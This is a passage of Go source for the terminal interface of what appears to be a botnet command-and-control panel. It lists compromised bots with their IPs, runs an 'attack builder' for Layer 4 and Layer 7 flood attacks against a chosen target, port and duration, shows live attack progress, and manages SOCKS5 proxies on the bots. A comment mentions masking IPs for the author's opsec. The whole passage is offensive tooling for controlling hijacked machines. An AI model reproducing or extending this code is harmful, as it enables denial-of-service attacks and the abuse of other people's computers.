		"99",  // Purple-blue
		"105", // Blue-purple
		"111", // Light blue
		"117", // Cyan-blue
		"123", // Light cyan
		"159", // Pale cyan
		"195", // Very light cyan
		"51",  // Cyan
		"50",  // Cyan-green
		"49",  // Teal
	}

	b.WriteString("\n")
	for i, line := range bannerLines {
		colorIdx := i
		if colorIdx >= len(gradientColors) {
			colorIdx = len(gradientColors) - 1
		}
		style := lipgloss.NewStyle().Foreground(lipgloss.Color(gradientColors[colorIdx]))
		b.WriteString(style.Render(line) + "\n")
	}

	// Compact stats bar right under banner
	statsBar := m.renderStatsBar()
	b.WriteString(statsBar)
	b.WriteString("\n\n")

	// Video game style menu
	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
	neonPink := lipgloss.NewStyle().Foreground(lipgloss.Color("201"))
	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))

	// Menu box
	menuWidth := 40
	b.WriteString(neonCyan.Render("    ╔"+strings.Repeat("═", menuWidth)+"╗") + "\n")
	b.WriteString(neonCyan.Render("    ║") + neonPink.Bold(true).Render(centerText("MAIN MENU", menuWidth)) + neonCyan.Render("║") + "\n")
	b.WriteString(neonCyan.Render("    ╠"+strings.Repeat("═", menuWidth)+"╣") + "\n")

	for i, item := range m.menuItems {
		if i == m.menuCursor {
			// Selected item with highlight bar
			selector := neonPink.Bold(true).Render(" ► ")
			itemText := lipgloss.NewStyle().
				Foreground(lipgloss.Color("51")).
				Background(lipgloss.Color("236")).
				Bold(true).
				Render(padRight(item, menuWidth-4))
			b.WriteString(neonCyan.Render("    ║") + selector + itemText + neonCyan.Render(" ║") + "\n")
		} else {
			// Unselected item
			b.WriteString(neonCyan.Render("    ║") + "    " + dim.Render(padRight(item, menuWidth-4)) + neonCyan.Render("║") + "\n")
		}
	}

	b.WriteString(neonCyan.Render("    ╠"+strings.Repeat("═", menuWidth)+"╣") + "\n")
	b.WriteString(neonCyan.Render("    ║") + dim.Render(centerText("[↑/↓] Navigate  [Enter] Select", menuWidth)) + "    " + neonCyan.Render("║") + "\n")
	b.WriteString(neonCyan.Render("    ╚"+strings.Repeat("═", menuWidth)+"╝") + "\n")

	return b.String()
}

// Helper function to center text within a given width
func centerText(text string, width int) string {
	if len(text) >= width {
		return text[:width]
	}
	padding := (width - len(text)) / 2
	return strings.Repeat(" ", padding) + text + strings.Repeat(" ", width-len(text)-padding)
}

// Helper function to pad text to the right
func padRight(text string, width int) string {
	if len(text) >= width {
		return text[:width]
	}
	return text + strings.Repeat(" ", width-len(text))
}

// DEMO MODE: Set to true to mask real IPs with random ones this is something I use for my own opsec during recording gifs for the docs
var demoMode = false

// Generate a deterministic random IP based on the real IP (so it stays consistent)
func maskIP(realIP string) string {
	if !demoMode {
		return realIP
	}
	// Use hash of real IP to generate consistent fake IP
	hash := 0
	for _, c := range realIP {
		hash = hash*31 + int(c)
	}
	if hash < 0 {
		hash = -hash
	}
	return fmt.Sprintf("%d.%d.%d.%d",
		(hash%200)+10,
		((hash/256)%200)+10,
		((hash/65536)%200)+10,
		((hash/16777216)%200)+10)
}

func (m TUIModel) renderStatsBar() string {
	// Styles
	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
	cyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
	green := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
	orange := lipgloss.NewStyle().Foreground(lipgloss.Color("214"))
	pink := lipgloss.NewStyle().Foreground(lipgloss.Color("201"))

	status := green.Render("● ONLINE")
	if m.botCount == 0 {
		status = lipgloss.NewStyle().Foreground(lipgloss.Color("196")).Render("○ NO BOTS")
	}

	ramStr := formatRAM(m.totalRAM)
	uptime := getC2Uptime()

	// Build compact single-line stats bar
	bar := fmt.Sprintf("  %s %s  %s %s  %s %s  %s %s  %s %s  %s %s",
		dim.Render("Status:"), status,
		dim.Render("│ Bots:"), green.Render(fmt.Sprintf("%d", m.botCount)),
		dim.Render("│ RAM:"), cyan.Render(ramStr),
		dim.Render("│ CPU:"), pink.Render(fmt.Sprintf("%d cores", m.totalCPU)),
		dim.Render("│ Uptime:"), orange.Render(uptime),
		dim.Render("│ TLS:"), green.Render("1.3"))

	return bar
}

func (m TUIModel) viewBotList() string {
	var b strings.Builder

	b.WriteString(headerStyle.Render("  CONNECTED BOTS"))
	b.WriteString("\n\n")

	if len(m.bots) == 0 {
		b.WriteString(subtitleStyle.Render("  No bots connected"))
		b.WriteString("\n")
	} else {
		// Table header
		header := fmt.Sprintf("  %-20s %-12s %-18s %-10s %-12s", "ID", "ARCH", "IP", "RAM", "UPTIME")
		b.WriteString(lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render(header))
		b.WriteString("\n")
		b.WriteString(lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render("  " + strings.Repeat("─", 75)))
		b.WriteString("\n")

		for i, bot := range m.bots {
			cursor := "  "
			style := botItemStyle
			if i == m.botCursor {
				cursor = "▸ "
				style = botSelectedStyle
			}

			uptime := formatDuration(bot.Uptime)
			line := fmt.Sprintf("%-20s %-12s %-18s %-10s %-12s",
				truncate(bot.ID, 18),
				bot.Arch,
				maskIP(bot.IP),
				formatRAM(bot.RAM),
				uptime,
			)
			b.WriteString(fmt.Sprintf("%s%s\n", cursor, style.Render(line)))
		}
	}

	b.WriteString("\n")
	b.WriteString(subtitleStyle.Render("  [q] Back  [r] Refresh  [enter] Select"))
	b.WriteString("\n")

	return b.String()
}

func (m TUIModel) viewAttack() string {
	var b strings.Builder

	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
	neonPink := lipgloss.NewStyle().Foreground(lipgloss.Color("201"))
	neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
	neonYellow := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
	neonRed := lipgloss.NewStyle().Foreground(lipgloss.Color("196"))
	neonOrange := lipgloss.NewStyle().Foreground(lipgloss.Color("208"))
	neonPurple := lipgloss.NewStyle().Foreground(lipgloss.Color("135"))
	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
	white := lipgloss.NewStyle().Foreground(lipgloss.Color("231"))
	darkGray := lipgloss.NewStyle().Foreground(lipgloss.Color("236"))

	// Cyberpunk box characters
	boxTL := "╔"
	boxTR := "╗"
	boxBL := "╚"
	boxBR := "╝"
	boxH := "═"
	boxV := "║"
	boxML := "╠"
	boxMR := "╣"

	// Show launch animation if active
	if m.launchAnimating {
		b.WriteString("\n")

		// Glitch effect characters
		glitchChars := []string{"░", "▒", "▓", "█", "▄", "▀", "■"}
		glitch := func() string {
			return glitchChars[m.launchAnimStage%len(glitchChars)]
		}

		// Animation frames with cyberpunk flair
		frames := []string{
			"  ◈ INITIALIZING ATTACK VECTORS...",
			"  ◈◈ ACQUIRING TARGET: " + m.launchAnimTarget,
			"  ◈◈◈ LOADING " + m.launchAnimMethod + " MODULE...",
			"  ◈◈◈◈ DEPLOYING " + fmt.Sprintf("%d", m.botCount) + " NODES...",
			"  ◈◈◈◈◈ SYNCHRONIZING PAYLOADS...",
			"  ▶ ATTACK SEQUENCE INITIATED",
			"  ▶▶ SWARM ACTIVE",
			"  ✓ OPERATION RUNNING",
		}

		// Cool loading bar with gradient effect
		barWidth := 44
		filled := (m.launchAnimStage + 1) * (barWidth / 8)
		if filled > barWidth {
			filled = barWidth
		}

		// Gradient bar
		var loadBar string
		for i := 0; i < barWidth; i++ {
			if i < filled {
				if i < filled/3 {
					loadBar += neonPurple.Render("█")
				} else if i < filled*2/3 {
					loadBar += neonPink.Render("█")
				} else {
					loadBar += neonCyan.Render("█")
				}
			} else {
				loadBar += darkGray.Render("░")
			}
		}

		// Cyberpunk animated border
		borderColor := neonPink
		if m.launchAnimStage >= 5 {
			borderColor = neonGreen
		}

		width := 52
		b.WriteString(borderColor.Bold(true).Render("  "+boxTL+strings.Repeat(boxH, width)+boxTR) + "\n")
		b.WriteString(borderColor.Bold(true).Render("  " + boxV))

		// Title with glitch effect
		if m.launchAnimStage >= 5 {
			title := "  ◆ ATTACK SEQUENCE ACTIVE ◆  "
			padding := (width - len(title)) / 2
			b.WriteString(strings.Repeat(" ", padding))
			b.WriteString(neonGreen.Bold(true).Render(title))
			b.WriteString(strings.Repeat(" ", width-padding-len(title)))
		} else {
			title := fmt.Sprintf("  %s INITIATING STRIKE %s  ", glitch(), glitch())
			padding := (width - len(title)) / 2
			b.WriteString(strings.Repeat(" ", padding))
			b.WriteString(neonCyan.Bold(true).Render(title))
			b.WriteString(strings.Repeat(" ", width-padding-len(title)))
		}
		b.WriteString(borderColor.Bold(true).Render(boxV) + "\n")

		b.WriteString(borderColor.Bold(true).Render("  "+boxML+strings.Repeat(boxH, width)+boxMR) + "\n")

		// Status line
		b.WriteString(borderColor.Bold(true).Render("  " + boxV))
		b.WriteString("  ")
		if m.launchAnimStage < len(frames) {
			if m.launchAnimStage >= 5 {
				b.WriteString(neonGreen.Bold(true).Render(fmt.Sprintf("%-50s", frames[m.launchAnimStage])))
			} else {
				b.WriteString(neonOrange.Render(fmt.Sprintf("%-50s", frames[m.launchAnimStage])))
			}
		}
		b.WriteString(borderColor.Bold(true).Render(boxV) + "\n")

		// Progress bar
		b.WriteString(borderColor.Bold(true).Render("  " + boxV))
		b.WriteString("  [")
		if m.launchAnimStage >= 5 {
			b.WriteString(neonGreen.Render(strings.Repeat("█", barWidth)))
		} else {
			b.WriteString(loadBar)
		}
		b.WriteString("] ")
		pct := (m.launchAnimStage + 1) * 100 / 8
		if pct > 100 {
			pct = 100
		}
		b.WriteString(neonCyan.Render(fmt.Sprintf("%3d%%", pct)))
		b.WriteString(borderColor.Bold(true).Render(boxV) + "\n")

		b.WriteString(borderColor.Bold(true).Render("  "+boxML+strings.Repeat(boxH, width)+boxMR) + "\n")

		// Target info with icons
		b.WriteString(borderColor.Bold(true).Render("  " + boxV))
		b.WriteString(fmt.Sprintf("  %s %s  %s %s  %s %s",
			neonPurple.Render("◈ METHOD:"), neonCyan.Bold(true).Render(m.launchAnimMethod),
			neonPurple.Render("◈ TARGET:"), neonYellow.Bold(true).Render(m.launchAnimTarget+":"+m.launchAnimPort),
			neonPurple.Render("◈ TIME:"), neonGreen.Bold(true).Render(m.launchAnimDur+"s")))
		infoLen := len("  ◈ METHOD: " + m.launchAnimMethod + "  ◈ TARGET: " + m.launchAnimTarget + ":" + m.launchAnimPort + "  ◈ TIME: " + m.launchAnimDur + "s")
		if infoLen < width {
			b.WriteString(strings.Repeat(" ", width-infoLen))
		}
		b.WriteString(borderColor.Bold(true).Render(boxV) + "\n")

		b.WriteString(borderColor.Bold(true).Render("  "+boxBL+strings.Repeat(boxH, width)+boxBR) + "\n")

		return b.String()
	}

	// ═══════════════════════════════════════════════════════════════════════
	// CYBERPUNK ATTACK CENTER HEADER
	// ═══════════════════════════════════════════════════════════════════════

	// Purple gradient colors matching main banner
	gradientColors := []lipgloss.Style{
		lipgloss.NewStyle().Foreground(lipgloss.Color("93")),  // Purple1 - darkest
		lipgloss.NewStyle().Foreground(lipgloss.Color("99")),  // Purple2
		lipgloss.NewStyle().Foreground(lipgloss.Color("105")), // Purple3
		lipgloss.NewStyle().Foreground(lipgloss.Color("111")), // Purple4
		lipgloss.NewStyle().Foreground(lipgloss.Color("117")), // Purple5
		lipgloss.NewStyle().Foreground(lipgloss.Color("123")), // Purple6
		lipgloss.NewStyle().Foreground(lipgloss.Color("159")), // Purple7
		lipgloss.NewStyle().Foreground(lipgloss.Color("195")), // Purple8 - lightest
		lipgloss.NewStyle().Foreground(lipgloss.Color("159")), // Purple7 (reverse gradient)
		lipgloss.NewStyle().Foreground(lipgloss.Color("117")), // Purple5
	}

	// ASCII art header with gradient
	b.WriteString("\n")
	headerArt := []string{
		"  ______     __      __                          __                 ",
		" /       |  /  |    /  |                        /  |                ",
		"/$$$$$$  | _$$ |_  _$$ |_     ______    _______ $$ |   __   _______ ",
		"$$ |__$$ |/ $$   |/ $$   |   /      |  /       |$$ |  /  | /       |",
		"$$    $$ |$$$$$$/ $$$$$$/    $$$$$$  |/$$$$$$$/ $$ |_/$$/ /$$$$$$$/ ",
		"$$$$$$$$ |  $$ | __ $$ | __  /    $$ |$$ |      $$   $$<  $$      $ ",
		"$$ |  $$ |  $$ |/  |$$ |/  |/$$$$$$$ |$$ |______ $$$$$$    $$$$$$  |",
		"$$ |  $$ |  $$  $$/ $$  $$/ $$    $$ |$$       |$$ | $$  |/     $$/ ",
		"$$/   $$/    $$$$/   $$$$/   $$$$$$$/  $$$$$$$/ $$/   $$/ $$$$$$$/  ",
		" ═══════════════════════════════════════════════════════════════",
		"     			☾℣☽  INTERACTIVE ATTACK BUILDER  ☾℣☽   ",
		" ═══════════════════════════════════════════════════════════════",
	}
	for i, line := range headerArt {
		colorIdx := i
		if colorIdx >= len(gradientColors) {
			colorIdx = len(gradientColors) - 1
		}
		b.WriteString(gradientColors[colorIdx].Bold(true).Render(line) + "\n")
	}

	// Count ongoing attacks from both sources
	ongoingCount := 0
	for _, attack := range ongoingAttacks {
		if time.Until(attack.start.Add(attack.duration)) > 0 {
			ongoingCount++
		}
	}
	for _, attack := range tuiAttacks {
		if time.Until(attack.Start.Add(attack.Duration)) > 0 {
			ongoingCount++
		}
	}

	// Tab bar with cyberpunk styling
	b.WriteString("\n    ")
	if m.attackViewMode == 0 {
		b.WriteString(neonPink.Bold(true).Render("┌──────────────┐"))
		b.WriteString(dim.Render("┌────────────────────┐"))
	} else {
		b.WriteString(dim.Render("┌──────────────┐"))
		b.WriteString(neonPink.Bold(true).Render("┌────────────────────┐"))
	}
	b.WriteString("\n    ")
	if m.attackViewMode == 0 {
		b.WriteString(neonPink.Bold(true).Render("│"))
		b.WriteString(neonCyan.Bold(true).Render(" ⚡ LAUNCH    "))
		b.WriteString(neonPink.Bold(true).Render("│"))
		b.WriteString(dim.Render("│"))
		if ongoingCount > 0 {
			b.WriteString(neonYellow.Render(fmt.Sprintf(" 📡 ACTIVE [%d]    ", ongoingCount)))
		} else {
			b.WriteString(dim.Render(" 📡 ACTIVE [0]    "))
		}
		b.WriteString(dim.Render("│"))
	} else {
		b.WriteString(dim.Render("│ ⚡ LAUNCH    │"))
		b.WriteString(neonPink.Bold(true).Render("│"))
		if ongoingCount > 0 {
			b.WriteString(neonYellow.Bold(true).Render(fmt.Sprintf(" 📡 ACTIVE [%d]    ", ongoingCount)))
		} else {
			b.WriteString(neonCyan.Bold(true).Render(" 📡 ACTIVE [0]    "))
		}
		b.WriteString(neonPink.Bold(true).Render("│"))
	}
	b.WriteString("\n    ")
	if m.attackViewMode == 0 {
		b.WriteString(neonPink.Bold(true).Render("└──────────────┘"))
		b.WriteString(dim.Render("└────────────────────┘"))
	} else {
		b.WriteString(dim.Render("└──────────────┘"))
		b.WriteString(neonPink.Bold(true).Render("└────────────────────┘"))
	}
	b.WriteString("\n\n")

	if m.attackViewMode == 0 {
		// ═══════════════════════════════════════════════════════════════════════
		// LAUNCH TAB - Cyberpunk Form
		// ═══════════════════════════════════════════════════════════════════════

		methodDisplay := m.attackMethod
		if methodDisplay == "" {
			methodDisplay = "[ SELECT ]"
		}

		// Form fields with cyberpunk styling
		fields := []struct {
			icon  string
			label string
			value string
			hint  string
		}{
			{"◈", "TARGET", m.attackTarget, "IP address or hostname"},
			{"◈", "PORT", m.attackPort, "Target port (default: 80)"},
			{"◈", "DURATION", m.attackDuration, "Attack duration in seconds"},
			{"◆", "METHOD", methodDisplay, "Press ENTER to select attack type"},
		}

		// Add proxy URL field only for L7 methods
		if isL7Method(m.attackCmd) {
			proxyHint := "URL to proxy list file"
			if m.attackProxyURL == "" {
				proxyHint = "Optional - leave blank for direct"
			}
			fields = append(fields, struct {
				icon  string
				label string
				value string
				hint  string
			}{"◇", "PROXY URL", m.attackProxyURL, proxyHint})
		}

		// Form box
		b.WriteString(neonPurple.Render("    ┌─────────────────────────────────────────────────────┐") + "\n")
		b.WriteString(neonPurple.Render("    │") + neonCyan.Bold(true).Render("           ◆ CONFIGURE ATTACK PARAMETERS ◆           ") + neonPurple.Render("│") + "\n")
		b.WriteString(neonPurple.Render("    ├─────────────────────────────────────────────────────┤") + "\n")

		for i, field := range fields {
			isSelected := i == m.attackCursor
			isEditing := m.attackInputActive && isSelected

			// Line start
			b.WriteString(neonPurple.Render("    │ "))

			// Cursor/icon
			if isSelected {
				b.WriteString(neonPink.Bold(true).Render("▶ " + field.icon + " "))
			} else {
				b.WriteString(dim.Render("  " + field.icon + " "))
			}

			// Label
			labelStyle := dim
			if isSelected {
				labelStyle = neonCyan.Bold(true)
			}
			b.WriteString(labelStyle.Render(fmt.Sprintf("%-10s", field.label)))
			b.WriteString(dim.Render(": "))

			// Value
			displayValue := field.value
			if displayValue == "" {
				displayValue = "_______________"
			}
			if displayValue == "[ SELECT ]" {
				if isSelected {
					b.WriteString(neonYellow.Bold(true).Render(displayValue))
				} else {
					b.WriteString(dim.Italic(true).Render(displayValue))
				}
			} else if isEditing {
				b.WriteString(neonGreen.Bold(true).Render(field.value))
				b.WriteString(neonGreen.Bold(true).Render("█"))
			} else if isSelected {
				b.WriteString(neonCyan.Bold(true).Render(displayValue))
			} else {
				b.WriteString(white.Render(displayValue))
			}

			// Padding and hint
			valueLen := len(displayValue)
			if isEditing {
				valueLen++
			}
			padding := 25 - valueLen
			if padding < 0 {
				padding = 0
			}
			b.WriteString(strings.Repeat(" ", padding))

			if isSelected && !isEditing {
				b.WriteString(dim.Italic(true).Render("← " + truncate(field.hint, 15)))
			} else {
				b.WriteString(strings.Repeat(" ", 17))
			}

			b.WriteString(neonPurple.Render(" │") + "\n")
		}

		b.WriteString(neonPurple.Render("    └─────────────────────────────────────────────────────┘") + "\n")

		// Command preview with cyberpunk box
		if m.attackMethod != "" && m.attackTarget != "" {
			port := m.attackPort
			if port == "" {
				port = "80"
			}
			dur := m.attackDuration
			if dur == "" {
				dur = "30"
			}
			var cmdPreview string
			if isL7Method(m.attackCmd) && m.attackProxyURL != "" {
				cmdPreview = fmt.Sprintf("%s %s %s %s -pu %s", m.attackCmd, m.attackTarget, port, dur, m.attackProxyURL)
			} else {
				cmdPreview = fmt.Sprintf("%s %s %s %s", m.attackCmd, m.attackTarget, port, dur)
			}
			b.WriteString("\n")
			b.WriteString(dim.Render("    ┌─ COMMAND PREVIEW ─────────────────────────────────┐") + "\n")
			b.WriteString(dim.Render("    │ "))
			b.WriteString(neonGreen.Bold(true).Render("$ " + cmdPreview))
			cmdLen := len("$ " + cmdPreview)
			if cmdLen < 51 {
				b.WriteString(strings.Repeat(" ", 51-cmdLen))
			}
			b.WriteString(dim.Render(" │") + "\n")
			b.WriteString(dim.Render("    └───────────────────────────────────────────────────┘") + "\n")
		}

		if m.errorMessage != "" {
			b.WriteString("\n")
			b.WriteString(neonRed.Bold(true).Render("    ⚠ ERROR: "+m.errorMessage) + "\n")
		}

		// Controls
		b.WriteString("\n")
		if m.attackInputActive {
			b.WriteString(neonPurple.Render("    ┌─ INPUT MODE ──────────────────────────────────────┐") + "\n")
			b.WriteString(neonPurple.Render("    │ ") + neonCyan.Render("Type value") + dim.Render(" │ ") + neonGreen.Render("[ENTER]") + dim.Render(" Confirm │ ") + neonRed.Render("[ESC]") + dim.Render(" Cancel  ") + neonPurple.Render("│") + "\n")
			b.WriteString(neonPurple.Render("    └───────────────────────────────────────────────────┘") + "\n")
		} else {
			b.WriteString(dim.Render("    ╭─────────────────────────────────────────────────────╮") + "\n")
			b.WriteString(dim.Render("    │ "))
			b.WriteString(neonGreen.Render("[ENTER]") + dim.Render(" Edit  "))
			b.WriteString(neonPink.Bold(true).Render("[L]") + dim.Render(" LAUNCH  "))
			b.WriteString(neonCyan.Render("[→]") + dim.Render(" Ongoing  "))
			b.WriteString(neonYellow.Render("[Q]") + dim.Render(" Back   "))
			b.WriteString(dim.Render("│") + "\n")
			b.WriteString(dim.Render("    ╰─────────────────────────────────────────────────────╯") + "\n")
		}

	} else {
		// ═══════════════════════════════════════════════════════════════════════
		// ONGOING TAB - Cyberpunk Attack Monitor
		// ═══════════════════════════════════════════════════════════════════════

		if ongoingCount == 0 {
			b.WriteString(neonPurple.Render("    ┌─────────────────────────────────────────────────────┐") + "\n")
			b.WriteString(neonPurple.Render("    │") + dim.Render("                                                     ") + neonPurple.Render("│") + "\n")
			b.WriteString(neonPurple.Render("    │") + dim.Render("          ◇ NO ACTIVE ATTACK OPERATIONS ◇           ") + neonPurple.Render("│") + "\n")
			b.WriteString(neonPurple.Render("    │") + dim.Render("                                                     ") + neonPurple.Render("│") + "\n")
			b.WriteString(neonPurple.Render("    │") + dim.Render("     Use the LAUNCH tab to initiate an attack        ") + neonPurple.Render("│") + "\n")
			b.WriteString(neonPurple.Render("    │") + dim.Render("                                                     ") + neonPurple.Render("│") + "\n")
			b.WriteString(neonPurple.Render("    └─────────────────────────────────────────────────────┘") + "\n")
		} else {
			// Active attacks header
			b.WriteString(neonRed.Bold(true).Render("    ┌─ LIVE ATTACK OPERATIONS ────────────────────────────┐") + "\n")

			// Table header
			b.WriteString(neonRed.Bold(true).Render("    │ "))
			b.WriteString(neonPurple.Bold(true).Render(fmt.Sprintf("%-10s", "METHOD")))
			b.WriteString(dim.Render(" │ "))
			b.WriteString(neonPurple.Bold(true).Render(fmt.Sprintf("%-18s", "TARGET")))
			b.WriteString(dim.Render(" │ "))
			b.WriteString(neonPurple.Bold(true).Render(fmt.Sprintf("%-6s", "TIME")))
			b.WriteString(dim.Render(" │ "))
			b.WriteString(neonPurple.Bold(true).Render("PROGRESS"))
			b.WriteString(neonRed.Bold(true).Render("     │") + "\n")

			b.WriteString(neonRed.Bold(true).Render("    ├──────────────────────────────────────────────────────┤") + "\n")

			// Display all attacks
			allAttacks := []struct {
				method    string
				target    string
				port      string
				remaining time.Duration
				total     time.Duration
			}{}

			for _, attack := range ongoingAttacks {
				remaining := time.Until(attack.start.Add(attack.duration))
				if remaining > 0 {
					allAttacks = append(allAttacks, struct {
						method    string
						target    string
						port      string
						remaining time.Duration
						total     time.Duration
					}{attack.method, attack.ip, attack.port, remaining, attack.duration})
				}
			}

			for _, attack := range tuiAttacks {
				remaining := time.Until(attack.Start.Add(attack.Duration))
				if remaining > 0 {
					allAttacks = append(allAttacks, struct {
						method    string
						target    string
						port      string
						remaining time.Duration
						total     time.Duration
					}{attack.Method, attack.Target, attack.Port, remaining, attack.Duration})
				}
			}

			for _, atk := range allAttacks {
				progress := 1.0 - (atk.remaining.Seconds() / atk.total.Seconds())
				barWidth := 10
				filled := int(progress * float64(barWidth))
				if filled > barWidth {
					filled = barWidth
				}

				// Gradient progress bar
				var bar string
				for i := 0; i < barWidth; i++ {
					if i < filled {
						if progress > 0.7 {
							bar += neonRed.Render("█")
						} else if progress > 0.4 {
							bar += neonOrange.Render("█")
						} else {
							bar += neonYellow.Render("█")
						}
					} else {
						bar += darkGray.Render("░")
					}
				}

				remainStr := fmt.Sprintf("%ds", int(atk.remaining.Seconds()))

				b.WriteString(neonRed.Bold(true).Render("    │ "))
				b.WriteString(neonCyan.Bold(true).Render(fmt.Sprintf("%-10s", truncate(atk.method, 10))))
				b.WriteString(dim.Render(" │ "))
				b.WriteString(white.Render(fmt.Sprintf("%-18s", truncate(atk.target+":"+atk.port, 18))))
				b.WriteString(dim.Render(" │ "))
				b.WriteString(neonGreen.Render(fmt.Sprintf("%-6s", remainStr)))
				b.WriteString(dim.Render(" │ "))
				b.WriteString(bar)
				b.WriteString(fmt.Sprintf(" %3d%%", int(progress*100)))
				b.WriteString(neonRed.Bold(true).Render(" │") + "\n")
			}

			b.WriteString(neonRed.Bold(true).Render("    └──────────────────────────────────────────────────────┘") + "\n")
		}

		// Controls
		b.WriteString("\n")
		b.WriteString(dim.Render("    ╭─────────────────────────────────────────────────────╮") + "\n")
		b.WriteString(dim.Render("    │ "))
		b.WriteString(neonRed.Bold(true).Render("[S]") + dim.Render(" STOP ALL  "))
		b.WriteString(neonCyan.Render("[←]") + dim.Render(" Launch  "))
		b.WriteString(neonGreen.Render("[R]") + dim.Render(" Refresh  "))
		b.WriteString(neonYellow.Render("[Q]") + dim.Render(" Back     "))
		b.WriteString(dim.Render("│") + "\n")
		b.WriteString(dim.Render("    ╰─────────────────────────────────────────────────────╯") + "\n")
	}

	return b.String()
}

func (m TUIModel) viewMethodSelect() string {
	var b strings.Builder

	b.WriteString(headerStyle.Render("  ⚡ SELECT ATTACK METHOD"))
	b.WriteString("\n\n")

	// Layer 4 attacks
	b.WriteString(lipgloss.NewStyle().Foreground(lipgloss.Color("214")).Bold(true).Render("  LAYER 4 (Network)"))
	b.WriteString("\n")
	b.WriteString(lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render("  " + strings.Repeat("─", 50)))
	b.WriteString("\n")

	for i, method := range attackMethods {
		if i == 8 { // After L4 methods, show L7 header
			b.WriteString("\n")
			b.WriteString(lipgloss.NewStyle().Foreground(lipgloss.Color("214")).Bold(true).Render("  LAYER 7 (Application)"))
			b.WriteString("\n")
			b.WriteString(lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render("  " + strings.Repeat("─", 50)))
			b.WriteString("\n")
		}
		if i == 2 { // HTTP methods are L7
			b.WriteString("\n")
			b.WriteString(lipgloss.NewStyle().Foreground(lipgloss.Color("214")).Bold(true).Render("  LAYER 7 (Application)"))
			b.WriteString("\n")
			b.WriteString(lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render("  " + strings.Repeat("─", 50)))
			b.WriteString("\n")
		}

		cursor := "  "
		style := menuItemStyle
		if i == m.methodCursor {
			cursor = "▸ "
			style = menuSelectedStyle
		}

		b.WriteString(fmt.Sprintf("%s%s  %s\n",
			cursor,
			style.Render(fmt.Sprintf("%-12s", method.name)),
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render(method.desc),
		))
	}

	b.WriteString("\n")
	b.WriteString(subtitleStyle.Render("  [enter] Select  [q] Back"))
	b.WriteString("\n")

	return b.String()
}

func (m TUIModel) viewSocks() string {
	var b strings.Builder

	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
	neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
	neonYellow := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
	neonPink := lipgloss.NewStyle().Foreground(lipgloss.Color("201"))
	neonRed := lipgloss.NewStyle().Foreground(lipgloss.Color("196"))
	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
	white := lipgloss.NewStyle().Foreground(lipgloss.Color("231"))

	b.WriteString(headerStyle.Render("  🧦 SOCKS5 PROXY MANAGER"))
	b.WriteString("\n")

	// View mode tabs
	viewModes := []string{"All Bots", "Active Socks", "Stopped"}
	b.WriteString("  ")
	for i, mode := range viewModes {
		if i == m.socksViewMode {
			b.WriteString(neonCyan.Bold(true).Render(" [" + mode + "] "))
		} else {
			b.WriteString(dim.Render("  " + mode + "  "))
		}
	}
	b.WriteString("\n")
	b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
	b.WriteString("\n\n")

	// Stats
	activeCount := 0
	for _, sock := range m.socksList {
		if sock.Status == "active" {
			activeCount++
		}
	}
	b.WriteString(fmt.Sprintf("  %s %s   %s %s   %s %s\n\n",
		dim.Render("Bots:"), white.Render(fmt.Sprintf("%d", len(m.bots))),
		dim.Render("Active Proxies:"), neonGreen.Render(fmt.Sprintf("%d", activeCount)),
		dim.Render("Bind:"), neonYellow.Render("0.0.0.0")))

	// Build display list based on view mode
	type displayItem struct {
		botID   string
		botIP   string
		botArch string
		port    string
		status  string
		started time.Time
	}
	var items []displayItem

	switch m.socksViewMode {
	case 0: // All Bots - show all connected bots
		for _, bot := range m.bots {
			item := displayItem{
				botID:   bot.ID,
				botIP:   bot.IP,
				botArch: bot.Arch,
				status:  "none",
			}
			// Check if this bot has active socks
			for _, sock := range m.socksList {
				if sock.BotID == bot.ID {
					item.port = sock.Port
					item.status = sock.Status
					item.started = sock.StartedAt
					break
				}
			}
			items = append(items, item)
		}
	case 1: // Active Socks only
		for _, sock := range m.socksList {
			if sock.Status == "active" {
				// Find bot info
				arch := ""
				for _, bot := range m.bots {
					if bot.ID == sock.BotID {
						arch = bot.Arch
						break
					}
				}
				items = append(items, displayItem{
					botID:   sock.BotID,
					botIP:   sock.BotIP,
					botArch: arch,
					port:    sock.Port,
					status:  "active",
					started: sock.StartedAt,
				})
			}
		}
	case 2: // Stopped
		for _, sock := range m.socksList {
			if sock.Status == "stopped" {
				arch := ""
				for _, bot := range m.bots {
					if bot.ID == sock.BotID {
						arch = bot.Arch
						break
					}
				}
				items = append(items, displayItem{
					botID:   sock.BotID,
					botIP:   sock.BotIP,
					botArch: arch,
					port:    sock.Port,
					status:  "stopped",
					started: sock.StartedAt,
				})
			}
		}
	}

	if len(items) == 0 {
		if m.socksViewMode == 0 {
			b.WriteString(dim.Render("  No bots connected"))
		} else {
			b.WriteString(dim.Render("  No socks proxies in this view"))
		}
		b.WriteString("\n")
	} else {
		// Table header
		header := fmt.Sprintf("  %-18s %-16s %-10s %-8s %-10s", "BOT ID", "IP", "ARCH", "PORT", "STATUS")
		b.WriteString(dim.Render(header))
		b.WriteString("\n")
		b.WriteString(dim.Render("  " + strings.Repeat("─", 66)))
		b.WriteString("\n")

		// Show max 10 items
		displayCount := len(items)
		if displayCount > 10 {
			displayCount = 10
		}

		for i := 0; i < displayCount; i++ {
			item := items[i]
			cursor := "  "
			style := botItemStyle
			if i == m.socksCursor {
				cursor = "▸ "
				style = botSelectedStyle
			}

			// Status + port display
			var statusStyled, portDisplay string
			switch item.status {
			case "active":
				statusStyled = neonGreen.Render("● ACTIVE")
				portDisplay = neonYellow.Render(item.port)
			case "stopped":
